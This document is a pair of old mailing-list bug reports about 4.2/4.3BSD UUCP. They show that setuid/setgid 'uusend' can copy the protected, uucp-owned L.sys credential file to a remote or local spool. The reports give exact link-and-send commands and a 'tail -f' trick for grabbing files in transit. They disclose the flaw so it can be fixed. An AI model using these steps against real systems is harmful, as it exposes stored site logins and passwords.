Subject: UUCP Bug under Berkeley??
Index: usr.bin 4.3BSD

I think I may have found a (perhaps) serious UUCP bug that exists, atleast,
on 4.2BSD.  I'm sure someone else has already found this, but I've never heard
of it before.

The bug is in "uusend". Apparently, "uusend" does not do the same checks
on a file that "uucp" does. 

The best way to explain the bug is to create the scenerio ...

USERFILE: 
	anyone,anysite /usr/spool/uucppublic

MODE of /usr/lib/uucp/L.sys:  600 owned by uucp
MODE of /usr/bin/uucp:       4111 owned by uucp
MODE of /usr/bin/uusend:     6111 owned by uucp (is this a typical mode??)

HACKER'S ROUTINE:

	link /usr/lib/uucp/L.sys /usr/spool/uucppublic/cat.c
	uucp /usr/spool/uucppublic/cat.c site!dir

	[ does not work ]

	link /usr/lib/uucp/L.sys /usr/spool/uucppublic/cat.c
	uusend /usr/spool/uucppublic/cat.c site!dir

	[ bingo!! ]

Does everyone have 'uusend' setup the same way?? Mode 6111??
I don't see why it needs the suid and sgid modes, all it does it
either invoke uucp or uux on the remote system, right??
I haven't fully tested "uusend" at another mode yet, but I think
that if everyone has uusend at 6111, then anything owned by UUCP
is subject to being seen by unwanted eyes.

I thought about posting this on usenet, but decieded not too.
Who is the collector of such bug reports?

ps: my bsd distribution tapes had "uusend" at mode 6111.

Subject: Re: UUCP Bug on 4.2??

I forgot to mention something regarding the previous mail about a bug
in "uusend".

Even if the remote system does not allow execution of "uusend", the file
is still transfered to the remote system if the mode of the local "uusend"
is (the default??) 6111. After it's sent, the remote system denies the
execution and sends mail back. But someone (or program) on the remote system
can still "tail -f TM.* > gotit" as soon as the TM. file is created.

Some more info on that bug with "uusend"...

I just took a poll of 12 sites runniing 4.2bsd (and clones) and found that
everyone of them had "uusend" set to mode 6111 owned by UUCP.

I also found that if the local system allows execution of "uusend", as defined
in L.cmds, then you can do the transfer locally!! Eg:

	cd /usr/lib/uucp
	uusend L.sys `uuname -l`!/usr/spool/uucppublic/anything

Since L.sys is owned by UUCP and is normally only readable by UUCP, and
since "uusend" is effectively UUCP ... it works; the local transfer only
takes 8.5 seconds too.

I hope no one has /etc/remote owned by UUCP as well.

Sorry that I sent everyone three messages, I should of investigate first
and sent just one message. I guess I got hyped up, or whatever.

Anyone want the L.sys file of !ucbvax? (Just kidding...)
